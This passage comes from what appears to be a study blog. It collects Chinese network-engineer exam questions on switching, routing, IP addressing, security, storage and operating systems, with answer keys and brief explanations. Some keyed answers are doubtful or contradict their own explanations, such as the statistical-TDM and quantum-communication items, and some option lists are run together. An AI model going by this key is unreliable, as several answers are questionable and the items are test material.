)。</li></ol><p>A.确保每个用户至少有一个最小保证时隙（解析：要结合缓冲区）<br>B.拒绝服务该用户的帧，直到其他用户的帧被传输动态调整时隙分配<br>C.强制降低该用户的传输速率<br>D.使用缓冲区来存储等待传输的帧，但不调整时隙分配（解析：会调整）</p></li></ul><blockquote><p>答：C</p></blockquote><blockquote><p>解析：TDM是时分复用，把信道的时间分成时间片，每个用户可以使用一个固定的时间片，但是有些时间某些用户是空闲的，所以有了STDM根据需求分配；将空闲的时间片分给其他用户。</p></blockquote><ul><li><ol><li>下列高速以太网连接技术中，传输距离超过 10km 的是( )。</li></ol><p>A.1000BASE-CX （解析：使用两对屏蔽双绞线，最大传输距离25M,常用在机柜中交换机之间的连接）<br>B.1000BASE-ZX （解析：千兆以太网，思科指定的标准，最大传输距离70km）<br>C.1000BASE-LX （解析：单模光纤，最大传输距离5km）<br>D.1000BASE-FX （解析：多模光纤，最大传输距离2km）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>某大型以太网只有两个主机，它们同时发送帧，形成碰撞后按截断二进制指数退避算法进行重传。重传次数记为 i，i&#x3D;1,2,3,…..，则一个主机成功发送数据之前的平均重传次数约为( )。</li></ol><p>A.1<br>B.4.75<br>C.1.64<br>D.3.25</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>当交换机收到一个帧，其目的 MAC 地址不在转发表中，则交换机将( )。</li></ol><p>A.洪泛该帧到其他所有端口<br>B.丢弃该帧<br>C.在输入端口复制该帧<br>D.在上联端口复制该帧</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>VLAN 技术所依据的协议是( )。</li></ol><p>A.IEEE 802.15 （解析：蓝牙）<br>B.IEEE 802.3 （解析：以太网）<br>C.IEEE 802.11 （解析：无线网）<br>D.IEEE 802.1q</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><p>9.下列关于 RSTP 的说法中正确的是( )。</p><p>A.交换机端口处于 discarding 状态即可进行流量转发 （解析：3种状态，forward才是转发的）<br>B.依靠计时器超时机制确定根端口和指定端口 （解析：依靠的是选举机制）<br>C.采用 P&#x2F;A 机制实现快速收敛 （解析：P是协商，A是同意;不用等待30s）<br>D.优先级数值大的交换机会被选为根桥 （解析：和生成树的机制一样，越小才对）</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列关于在交换机上配置 VLAN 的说法中，正确的是( )。</li></ol><p>A.交换机中的 VLAN 均有其对应的 VLANIF 接口 （解析：每一个vlanif接口都有一个对应的VLAN，反之不成立）<br>B.可用 VLAN 编号范围是 0-4096 （解析：0-4095,可用范围1-4094）<br>C.交换机中的所有 VLAN 均可删除 （解析：默认的VLAN 1 无法删除）<br>D.交换机中的 VLAN 数量与其物理接口数量无关</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在量子通信领域，为了实现信息的绝对安全传输，通常采用( )。</li></ol><p>A.经典电磁波，通过光纤传输<br>B.量子隐形传态，无需物理介质，通过量子纠缠实现<br>C.纠缠态量子比特，通过自由空间（如大气层）传输<br>D.单个光子，通过超低损耗的单模光纤传输</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506212654442.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>网络信息系统的可靠性测度不包括( )</li></ol><p>A.完整性<br>B.有效性<br>C.抗毁性 （解析：人为破坏）<br>D.生存性 （解析：随机破坏）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506212900733.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列关于交换机堆叠的说法正确的是( )。</li></ol><p>A.Master 交换机故障后，Slave 交换机中优先级值最大的会被选举为 Master 交换机，承担控制层面功能 （解析： 只有一个Slave, Master才需要选）<br>B.堆叠就是将多台交换机相互级联 （解析：堆叠是通过堆叠卡，当成一台管理；级联通过任意普通口连接起来，还是多台交换机，分别管理）<br>C.Master 交换机和 Backup、Slave 交换机共同承担数据转发<br>D.必须使用专用堆叠卡和堆叠线缆 （解析：还可以使用高速的光纤等也可以）</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>基于 L 的最大值，假设运输层、网络层和数据链路层所用的首部开销共 66 字节，链路的数据率为 10Mbit&#x2F;s，则发送该文件所需的最短时间为( )。</li></ol><p>A.3591.29s<br>B.3435.97s<br>C.429.49s<br>D.448.91s</p></li></ul><blockquote><p>答：A</p></blockquote><blockquote><p>解析：2^32&#x2F;1460 &#x3D; 2941758.42 帧；….</p></blockquote><ul><li><ol><li>在路由器三层接口下配置如下所示命令，其作用是( )。</li></ol><p>A.配置 192.168.1.253 为非信任 DHCP 服务器<br>B.配置 DHCP 中继<br>C.使能全局 DHCP 功能，并配置 DHCP 服务器 IP 为 192.168.1.253<br>D.由于三层接口无法转发 DHCP 广播报文，上述配置无效</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506213840444.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>数据链路层如果采用滑动窗口协议进行可靠传输，并且发生了帧丢失，则对同步控制造成的影响是( )。</li></ol><p>A.同步控制依赖于更高层的协议来处理帧丢失 （解析：不是更高层，还是数据链路层控制）<br>B.同步控制完全失效，需要重新建立连接 （解析：不需要重新建立连接，需要请求重传丢失的帧，或者通过确认机制来同步这些确认信息）<br>C.同步控制不受影响，但会导致重传和可能的拥塞 （解析：受影响，不会导致拥塞）<br>D.同步控制通过自动重传请求（ARQ）机制来恢复</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>静态路由的缺点是( )。</li></ol><p>A.路由收敛慢<br>B.不能灵活适应网络结构的变化<br>C.不支持 IPv6<br>D.必须运行路由协议才能生成路由表</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>当IP报文在网络传输时，如果其生存时间（TTL）减至0，将会发送的ICMP消息是（）。</li></ol><p>A.Parameter Problem (type: 12)<br>B.TTL Exceeded (type: 11)<br>C.Source Quench (type: 4)<br>D.Destination Unreachable (Type: 3)</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在路由器上做以下配置，其作用是( )。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506214541829.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.允许访问路由器管理接口<span class="hljs-selector-tag">B</span>.全局开启管理接口的流量抑制功能C.开启管理接口的流量统计功能D.限制管理口和业务接口之间的流量转发复制代码</code></pre><blockquote><p>答：D</p></blockquote><blockquote><p>解析：命令的作用是使能业务口和管理口的流量隔离</p></blockquote><ul><li><ol><li>交换机 SW3 生成树信息如下图所示，下列关于该交换机生成树的说法中正确的是( )。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506214949311.png" alt="img"></p><pre><code class="hljs awk">A.交换机 SW3 的生成树模式为 RSTP （解析： 有MSTID，说明是MSTP协议）B.Instance <span class="hljs-number">20</span>MST 域内，GigabitEthernet0<span class="hljs-regexp">/0/</span><span class="hljs-number">1</span> 为 GigabitEthernet0<span class="hljs-regexp">/0/</span><span class="hljs-number">2</span> GigabitEthernet0<span class="hljs-regexp">/0/</span><span class="hljs-number">3</span>的备份端口 （<span class="hljs-number">3</span>个都是Forwarding状态，所以是错的，应该是Discarding）C.SW3 为 Instance <span class="hljs-number">20</span>MST 域的根桥 (解析：根桥没有Root根端口，只能有指定端口)D.SW3 为 Instance <span class="hljs-number">10</span>MST 域的根桥复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li><ol><li>访问HTTP连接和HTTPS链接分别使用的默认端口是( )。</li></ol><p>A.443 和 443<br>B.443 和 80<br>C.80 和 443<br>D.80 和 80</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506215731769.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>交换机二层环路后可能产生的故障现象不包括( )。</li></ol><p>A.交换机管理口无法登录<br>B.交换机命令操作变得卡顿<br>C.交换机下连接的终端访问网络很慢或者无法访问网络<br>D.交换机的接口指示灯由绿灯变为黄灯 (解析：绿灯说明是千兆的速率，黄灯说明是百兆的速率)</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列 IPv6 数据报头的字段在 IPv4 报文中无对应功能的是( )。</li></ol><p>A.Payload Length (解析：负载长度；IPv6是不包括固定头部)<br>B.Traffic Class (解析：通信类型；ipv4是区分类型，ipv6是通信类型)<br>C.Hop Limit （解析：调数；ipv4是生产时间，ipv6是跳数限制）<br>D.Flow Label</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506220132899.png" alt="IPv4"></p><p>IPv4</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506220208249.png" alt="IPv6"></p><p>IPv6</p><blockquote><p>答：D</p></blockquote><blockquote><p>解析：流标志，原目地址相同的可以统一处理，不用按数据包一个个转发；第二个IPv6安全性更高。</p></blockquote><ul><li><ol><li>根据《中华人民共和国数据安全法》，国家( )依照本法和有关法律、行政法规的规定，负责统筹协调网络数据安全和相关监管工作。</li></ol><p>A.网信部门<br>B.工信部门<br>C.公安机关<br>D.检察机关</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506220639904.png" alt="数据安全法规定"></p><p>数据安全法规定</p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在 NFV (网络功能虚拟化)环境，()负责执行虚拟化的网络功能。</li></ol><p>A.VNF<br>B.VNFM<br>C.MANO<br>D.NFVI</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506221010882.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>在Linux操作系统中，主机名到IP地址的映射包含在()配置文件中。</li></ol><p>A.&#x2F;etc&#x2F;networks (解析：网络的设置)<br>B.&#x2F;etc&#x2F;hostname (解析：主机名)<br>C.&#x2F;etc&#x2F;hosts (解析：解析域名到IP地址的映射关系)<br>D.&#x2F;etc&#x2F;resolv.conf (解析：设置主DNS服务器或者备份DNS服务器的IP地址)<br>E.&#x2F;etc&#x2F;host.conf (解析：设置域名解析顺序)</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>在Linux操作系统中，要做指定文件中查找目标文字可以用()。</li></ol><p>A.grep (解析：查看文件中符合条件的字符串或者内容)<br>B.find (解析：查找文件和目录)<br>C.search (解析：在windows中显示可安装的程序)<br>D.wget (解析：下载工具)</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列关于VLAN间通信的说法中，正确的是（）。</li></ol><p>A.不同VLAN之间可以使用专用线缆链接以实现其通信<br>B.同交换机中相同VLAN间通信，必须通过三层实现<br>C.不同VLAN跨交换机通信必须通过三层实现<br>D.相同交换机中不同VLAN间通信，无需通过VLANIF接口</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列关于 SNMP 的说法正确的是()。</li></ol><p>A.SNMP 可以实现对不同设备的统一管理，管理成本低<br>B.SNMP 采用TCP报文承载数据，保障设备信息传输的可靠性 （解析：UDP，端口是161是发送和接受，162是报警信息接收的端口）<br>C.SNMPv2 在 SNMPv1 的基础上重新定义了网络管理框架和安全机制 （解析：没有添加安全机制）<br>D.SNMPv3 专为管理 IPv6设备而定制的版本，不支持 IPv4 设备 （解析：也支持IPv4）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506221933722.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>数字证书的作用是（）。</li></ol><p>A.隐藏用户私钥 （解析：用户保存）<br>B.防止用户公钥泄露 （解析：公开公钥）<br>C.保障数据完整性 (解析：数字签名)<br>D.绑定实体与公钥</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506222306729.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>ARP病毒通过()影响网络通信。</li></ol><p>A.拦截和篡改IP数据包<br>B.SYN泛洪占用大量网络带宽导致网络拥塞<br>C.伪造ARP请求或应答来欺骗网络中的设备<br>D.加密网络流量使其无法被正确解析</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>UTM (统一威胁管理系统) 的功能不包括（）。</li></ol><p>A.重要数据加密和备份<br>B.恶意软件过滤<br>C.访问控制<br>D.垃圾邮件拦截2</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506222832261.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>根据《中华人民共和国个人信息保护法》，个人信息处理者应当主动删除个人信息的情形不包括（）。</li></ol><p>A.处理目的已实现或无法实现<br>B.法律、行政法规规定的保护期限未届满<br>C.个人信息处理者停止提供产品或复制<br>D.个人信息处理者违反法律、行政法规</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507113524142.png" alt="img"></p><blockquote><p>答：B</p></blockquote><ul><li><ol><li>RSA加密算法的安全性依赖于（）问题的困难性。</li></ol><p>A.大素数分解<br>B.子集合<br>C.合数剩余判定<br>D.离散对数</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列加密算法可以抵抗潜在量子计算攻击的是（）。</li></ol><p>A.AFS<br>B.RSA<br>C.同本加密<br>D.格级加密</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>某主机防火墙访问控制配置如下图所示，下列说明中正确的是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507114020594.png" alt="img"></p><pre><code class="hljs autoit">A.仅运行该主机<span class="hljs-built_in">ping</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.254</span>主机B.允许所有主机访问该主机的SSH服务C.允许所有主机<span class="hljs-built_in">ping</span>该主机D.允许所有主机使用https协议访问该主机的web服务复制代码</code></pre><blockquote><p>答：D</p></blockquote><ul><li><ol><li>主机A向主机B发送一个长度为L字节的文件，假设TCP的MSS为1460字节，则在TCP的序号不重复使用的前提下，L的最大值是（）。</li></ol><p>A.2^16-1<br>B.2^16<br>C.2^32<br>D.2^32-1</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>电子邮件采用SMTP协议进行传输，在（）的支持下，确保了其 传输的邮件内容包括不限于文件形式。</li></ol><p>A.MIME<br>B.HTML<br>C.MIMO<br>D.ASCLL</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507151538327.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>若数据链路层采用回退N帧（GBN）协议，发送窗口的大小为32，则至少需要（）序列号空间。</li></ol><p>A.7位<br>B.5位<br>C.6为<br>D.4位</p></li></ul><blockquote><p>答：C</p></blockquote><blockquote><p>解析：w&lt;&#x3D;2^k-1 &#x3D;&gt; 32&lt;&#x3D;2^6-1</p></blockquote><ul><li><ol><li>某网络拓扑如图1所示，路由器R1、R2、R3已完成相关配置，且建立OSPF邻居关系，在路由器R3配置静态路由并引入到OSPF，详见图2，在路由器上R1上配置ACL过滤10.0.1.0的路由条目在OSPF的引入配置详解图3，ACL配置完成后，路由器R1的路由表如图4所示，此时，在路由器R1没有到23.1.1.0、10.0.2.0的路由，造成该问题的原因是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507152059212.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507152119241.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507152137834.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span><span class="hljs-selector-class">.acl</span> <span class="hljs-number">2001</span>中未配置放行规则<span class="hljs-selector-tag">B</span><span class="hljs-selector-class">.acl</span> <span class="hljs-number">2001</span>的rule <span class="hljs-number">100</span> 中配置的通配符为<span class="hljs-number">0</span>，造成过滤范围扩大C.基本acl无法实现该要求，应使用高级acl配置规则过滤D<span class="hljs-selector-class">.acl</span>无法实现该要求，应使用ip-prefix前缀列表配置规则过滤复制代码</code></pre><blockquote><p>答：A</p></blockquote><ul><li><ol><li>在采用OFDM的5G网络中，调制解调器（）处理多径干扰。</li></ol><p>A.通过增加信号的发射功率来覆盖所有可能的路径<br>B.将可用带宽划分为多个正交子载波，每个子载波携带部分数据<br>C.使用单一载波并增加信号的带宽<br>D.引入时间延迟来同步不同路径的型号</p></li></ul><blockquote><p>答:B</p></blockquote><ul><li><ol><li>某网络中，在SW1和SW2上做如下配置，实现的功能包括（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250507152627436.png" alt="img"></p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.配置了跨设备链路聚合，实现链路冗余 (实现负载分担)<span class="hljs-selector-tag">B</span>.配置了负载分担模式，实现两条链路共同承担流量C.配置了基于LACP（链路聚合控制协议）的链路聚合模式D.两台交换机的链路聚合组编号不一致，上述配置无法生效复制代码</code></pre><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在SDN体系中，OpenFlow协议主要用于（）。</li></ol><p>A.网络设备之间的通信<br>B.网络设备的远程管理<br>C.网络设备的配置<br>D.网络设备与控制平台之间的通信</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511112944958.png" alt="img"></p><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列关于光纤FC交换机的说法中错误的是（）。</li></ol><p>A.光纤FC交换机用Zone来划分逻辑通道，不同Zone的设备无法相互通信<br>B.光纤FC交换机将存储设备、服务器等设备连接起来组成光纤通道网络<br>C.光纤FC交换机与以太网光纤交换机相同，都是基于IP协议工作<br>D.光纤FC交换机与以太网光纤交换机相比，具有低延迟和无损坏数据传输的优点</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>若要为一个域名做IPv6地址映射，需在DNS中添加（）记录。</li></ol><p>A.AAAA<br>B.CNAME<br>C.A<br>D.NS</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511113248817.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>UDP段可容纳的最大负载是（）字节。</li></ol><p>A.65535<br>B.4096<br>C.1024<br>D.65527</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>IPv4地址10.10.216.18&#x2F;20的网络地址是（）。</li></ol><p>A.10.10.216.0<br>B.10.10.210.0<br>C.10.10.210.32<br>D.10.10.208.0</p></li></ul><blockquote><p>答：D 216&#x3D;1101 1000 &#x3D;&gt; 1101 &#x3D; 208</p></blockquote><ul><li><ol><li>计划将C类地址192.168.20.0、192.168.21.0、192.168.22.0和192.168.23.0中的两个聚合为一个不少于400个可用IP的地址段，下列方案中，最节约地址的是（）。</li></ol><p>A.聚合192.168.21.0、192.168.22.0两个地址段为192.168.21.0&#x2F;23<br>A.聚合192.168.21.0、192.168.23.0两个地址段为192.168.20.0&#x2F;23<br>A.聚合192.168.20.0、192.168.21.0两个地址段为192.168.20.0&#x2F;23<br>A.聚合192.168.20.0、192.168.22.0两个地址段为192.168.20.0&#x2F;23</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li><ol><li>某单位为营业部分配的网络号是10.10.7.64&#x2F;26，该网络有（）个可用IP地址。</li></ol><p>A.62<br>B.32<br>C.30<br>D.70</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>IPv6中的环回地址是（）。</li></ol><p>A.FE80::&#x2F;10 (链路本地地址)<br>B.2001::&#x2F;16 （全球单播地址首个分配的地址）<br>C.::1&#x2F;128<br>D.127.0.0.1::&#x2F;96</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511114206581.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>路由器R1和R2配置OSPF动态路由，拓扑如图1所示，其中接口IP已正确配置，OSPF配置详见图2。配置完成后，OSPF邻居关系无法建立，请分析可能的原因是（）。</li></ol></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250508113629342.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250508113650446.png" alt="img"></p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>.接口地址不在network命令指定的网络范围内 （network <span class="hljs-number">12.1.1.0</span> <span class="hljs-number">0.0.0.255</span>）B.OSPF进程ID冲突C.Network命令指定的网络范围过大D.未指定Router-id复制代码</code></pre><blockquote><p>答：A</p></blockquote><ul><li><ol><li>网络管理员在某主机上看到如下图所示安全日志，说明该主机收到（）攻击。</li></ol><p>IP地址</p><p>A.XSS<br>B.DDos<br>C.蠕虫病毒<br>D.SQL注入</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511114710478.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列关于MUX VLAN的说法正确的是（）。</li></ol><p>A.隔离型子VLAN仅可以和主VLAN通信，且与同VLAN内其他接口无法通信<br>B.MUX VLAN是三层交换机才支持的功能 (二层交换机也可以)<br>C.2个互通型VLAN之间的接口可以互相通信 （互通性VLAN只能和主VLAN通信，或者和同一个组的VLAN通信）<br>D.MUX VLAN是将多个聚合成一个逻辑VLAN，实现网关共用（实现隔离）</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>WiFI7标准将于近期正式发布，该标准将最大信道带宽扩展到（）Mz，其最大吞吐率将超过30Gbps。</li></ol><p>A.320<br>B.240<br>C.160<br>D.180</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511115041246.png" alt="img"></p><blockquote><p>答：A</p></blockquote><ul><li><ol><li>路由器R1和R2配置建立EBGP邻居，配置完成后，在R1查看邻居状态，显示R2处于Established状态，处于该状态的原因是（）。</li></ol><p>A.邻居关系已经正确建立 (Established表示建立连接了)<br>B.路由不可达<br>C.重传定时器超时<br>D.在等待TCP三次握手</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列路由协议中使用“基于跳数计算的路由算法”的是（）。</li></ol><p>A.OSPF<br>B.OSPFv3<br>C.RIP<br>D.IS-IS</p></li></ul><blockquote><p>答：C</p></blockquote><ul><li>57.58. 某广播型网络的拓扑如下图所示，所有路由器均运行OSPF路由协议，R1和R2的接口优先级为0，R3的接口优先级为100，R4的接口优先级为101，则路由器（）会选举为DR路由器，R1和R2的OSPF邻居状态为（）。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250509092706655.png" alt="img"></p><pre><code class="hljs stylus">A<span class="hljs-selector-class">.R2</span>B<span class="hljs-selector-class">.R3</span>C<span class="hljs-selector-class">.R4</span>D<span class="hljs-selector-class">.R1</span>A.<span class="hljs-number">2</span>-WayB<span class="hljs-selector-class">.Full</span>C<span class="hljs-selector-class">.Init</span>D<span class="hljs-selector-class">.Exstart</span>复制代码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511115419888.png" alt="img"></p><blockquote><p>答：C，A</p></blockquote><ul><li><ol><li>在Windows操作系统中，可以使用（）命令登录到远程主机进行系统管理。</li></ol><p>A.shell (命令行工具)<br>B.telnet<br>C.TTL （生成期）<br>D.SSH （安全协议，没有提加密传输）</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>为了保护无线局域网用户的隐私，同时便于用户扫描和连接，在特定场景所临时组建的无线网络中，应开启（）功能。</li></ol><p>A.AP Isolation （将无线客户端完全隔离，保护用户隐私，方便用户扫描连接）<br>B.SNTP （简单网络时间协议，同步网络中的时钟信号的）<br>C.Repeater （中继器，物理层设备）<br>D.SSID隐藏</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>无源光网络PON中，ONU到OLT上线数据的复用方式和ONU下行数据的复用方式分别是（）。</li></ol><p>A.广播和TDMA<br>B.TDMA和FDMA<br>C.广播和FDMA<br>D.TDMA和广播</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511120428196.png" alt="img"></p><blockquote><p>答：D</p></blockquote><p>-# 62. 在网络工程的需求获取过程中，（）是关键。</p><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>.设计 <span class="hljs-selector-tag">B</span>.沟通C.选项D.运维复制代码</code></pre><blockquote><p>答：B</p></blockquote><ul><li><ol><li>某IPv4地址所在网络的广播地址是192.168.3.255，该地址所在的网络地址可能是（）。</li></ol><p>A.192.168.51.0<br>B.192.168.0.0<br>C.192.168.216.0<br>D.192.168.28.0</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>下列属于BCP路由协议防环措施的是（）。</li></ol><p>A.从EBGP邻居收到的路由不会转发给另外一个EBGP邻居<br>B.从IBGP邻居收到的路由转发给EBGP邻居时，修改下一跳地址<br>C.设置最大跳数不超过15<br>D.从IBGP邻居收到的路由不会转发给另外一个IBGP邻居</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>把一部分磁盘空间充当内存使用，避免执行的程序很大或很多导致内存消耗殆尽，该技术被称为（）。</li></ol><p>A.虚拟内存<br>B.动态内存<br>C.分级存储<br>D.高速缓存</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>下列存储器类型中，掉电后所存储数据会丢失的是（）。</li></ol><p>A.HDD<br>B.eMMC (MMC多媒体卡的扩展标准，针对的是嵌入式产品，或者手机的存储)<br>C.SDRAM<br>D.SSD</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511121102013.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>下列概念中，与操作系统并发无关的是（）。</li></ol><p>A.虚拟存储器<br>B.优先级调度<br>C.时间片轮转<br>D.上下文切换</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>RFID技术在物理网应用中，主要时间（）功能。</li></ol><p>A.感知<br>B.计算<br>C.标识<br>D.数据传输</p></li></ul><blockquote><p>答：C RFID电子标签，ETC</p></blockquote><ul><li><ol><li>为项目过程中可能存在的各类风险指定处理预案，属于（）。</li></ol><p>A.风险管理规划<br>B.风险量化<br>C.风险监控<br>D.风险识别</p></li></ul><blockquote><p>答：A</p></blockquote><ul><li><ol><li>计算机体系中使用总线结构，有助于（）。</li></ol><p>A.减少通信传输线的条数<br>B.减少通信传输量<br>C.提高通信传输速度<br>D.提高信息的安全性</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250511121535250.png" alt="img"></p><blockquote><p>答：A</p></blockquote><hr><h2 id="2024年5月"><a href="#2024年5月" class="headerlink" title="2024年5月"></a>2024年5月</h2><ul><li><ol><li>基于时间片轮转的进调度中，一个进程（）是该进程会运行态变成就绪态。</li></ol><p>A.等待的事件发生<br>B.向其他进程发消息<br>C.时间片到<br>D.等待的事件未发生</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512200406099.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>32位操作系统理论上支持的最大内存容量为（）。</li></ol><p>A.1GB<br>B.16GB<br>C.2GB<br>D.4GB</p></li></ul><blockquote><p>答：D</p></blockquote><ul><li><ol><li>下列存储介质中，掉电时不会丢失信息的是（）。</li></ol><p>A.CPU寄存器<br>B.闪存 （flash，U盘）<br>C.高速缓存<br>D.内存</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>硬盘属于（B）。</li></ol><p>A.只读存储器<br>B.外部存储器<br>C.内部存储器<br>D.输出设备</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>在Linux系统中，鼠标，键盘等以字节单位进行输入输出的设备属于（）。</li></ol><p>A.虚拟设备<br>B.网络设备<br>C.字符设备 （文本，很慢的)<br>D.快设备 （磁盘，有4k）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512200945683.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>某系统按照RAID6冗余设计，要求2个独立的RAID组，且配备1块全局热备盘，该存储系统至少要购置（）快磁盘。</li></ol><p>A.10<br>B.9<br>C.8<br>D.7</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512201216222.png" alt="img"></p><blockquote><p>答：B</p></blockquote><blockquote><p>解析：Riad5 最少3块盘，Riad6 最少4块盘</p></blockquote><ul><li><ol><li>()不能提升多线程的运行效率。</li></ol><p>A.使用更高主频的CPU<br>B.使用更高电压的电源<br>C.使用GPU处理并行计算<br>D.使用更多核的CPU</p></li></ul><blockquote><p>答：B</p></blockquote><ul><li><ol><li>以太网10BASE-T的编码方式是（）。</li></ol><p>A.4B&#x2F;5B编码<br>B.差分曼彻斯特编码<br>C.曼彻斯特编码<br>D.归零编码</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512201559986.png" alt="img"></p><blockquote><p>答：C</p></blockquote><ul><li><ol><li>计算机网络的编码与传输过程中，校验码主要用于（）。</li></ol><p>A.分组分类<br>B.流量控制<br>C.拥塞控制<br>D.差错检测</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250512201706121.png" 